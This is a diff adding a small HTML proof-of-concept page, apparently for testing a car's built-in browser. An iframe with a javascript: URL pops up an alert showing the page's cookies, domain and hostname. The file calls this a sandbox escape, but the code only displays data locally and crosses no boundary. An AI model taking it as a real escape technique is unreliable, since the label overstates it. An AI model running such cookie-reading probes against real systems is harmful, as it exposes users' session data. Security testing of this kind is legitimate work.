@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Car Browser Sandbox Escape PoC</title>
+</head>
+<body>
+<h1>Car Browser Sandbox Escape PoC</h1>
+<p>Attempt to escape the browser sandbox and display browser cookies and document domains:</p>
+
+<script>
+// Attempting to escape the sandbox
+var iframe = document.createElement('iframe');
+iframe.src = 'javascript:alert("Sandbox Escaped iframe! Cookies: " + document.cookie + " Document Domain: " + document.domain + " Iframe Domain: " + window.location.hostname)';
+document.body.appendChild(iframe);
+</script>
+</body>
+</html>
